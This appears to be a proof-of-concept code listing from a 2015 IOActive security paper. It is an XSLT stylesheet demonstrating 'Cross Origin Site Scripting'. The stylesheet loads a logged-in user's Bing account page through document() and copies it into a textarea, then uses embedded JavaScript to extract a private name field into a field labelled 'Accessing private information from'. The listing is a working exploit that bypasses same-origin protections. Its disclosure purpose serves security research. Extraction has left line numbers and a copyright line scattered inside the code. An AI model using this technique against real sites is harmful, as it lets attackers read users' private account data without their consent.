<?xml version="1.0" encoding="utf-8"?>
 3 <?xml-stylesheet type="text/xsl" href="cross-origin.xhtml"?>
 4 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns="http://www.w3.org/1999/xhtml">
 5
 6 <xsl:template match="xsl:stylesheet">
 7 <xsl:apply-templates/>
 8 </xsl:template>
 9
10 <xsl:template match="/">
11 <html>
12 <head>
13 <style>
14 body {background-color: #A82A26;}
15 table {background-color: #FFFFFF;
16 border-style: solid;
17 border-collapse: collapse;
18 border-color: #CCCCCC;}
19 h1 {color:#FFFFFF;
20 text-align:center;}
21 </style>
22 <title>IOActive - XOSS (Cross Origin Site Scripting)</title>
23 </head>
24 <body>
25 <h1>IOActive - XOSS (Cross Origin Site Scripting)</h1>
<br/>
27 <table align="center">
28 <xsl:apply-templates />
29 </table>
30 </body>
31 </html>
32 </xsl:template>
33
34 <xsl:template match="text()"/>
35
36 <xsl:template match="//node()[local-name() = name()]">
37 <xsl:if test="local-name() = 'url'">
38 <xsl:variable name="url" select="document(.)"/>
39 <tr>
40 <td>
41 <b>URL:</b>
42 </td>
43 <td>
44 <xsl:value-of select="."/>
45 </td>
46 </tr>
47 <tr>
48 <td>
49 <b>&lt;xsl:value-of&gt;</b>
50 </td>
51 <td>
52 <textarea id="valueOf" rows="10" cols="100">
53 <xsl:value-of select="$url"/>
54 </textarea>
55 </td>
56 </tr>
57 <tr>
58 <td>
59 <b>&lt;xsl:copy-of&gt;</b>
60 </td>
61 <td>
62 <textarea id="copyOf" rows="10" cols="100">
63 <xsl:text disable-output-escaping="yes">
64 &lt;![CDATA[
65 </xsl:text>
66 <xsl:copy-of select="$url"/>
67 <xsl:text disable-output-escaping="yes">
68 ]]&gt;
69 </xsl:text>
70 </textarea>
71 </td>
72 </tr>
73 <tr>
74 <td>
75 <b>Accessing private
76 information from:</b>
77 </td>
78 <td>
79 <input type="text" id="internal"/>
80 <script type="text/javascript">
81 var copyOf = document.getElementById("copyOf").value;
82 var firstname = copyOf.substring(copyOf.indexOf('"id_n">')+7);
83 var internal = document.getElementById("internal");
84 internal.value = firstname.substring(0,8);
85 </script>
  </td>
87 </tr>
© 2015 IOActive, Inc. All Rights Reserved. [20]
88 </xsl:if>
89 <xsl:apply-templates/>
90 </xsl:template>
91
92 <read>
93 <url>http://www.bing.com/account/general</url>
94 </read>
95
96 </xsl:stylesheet>
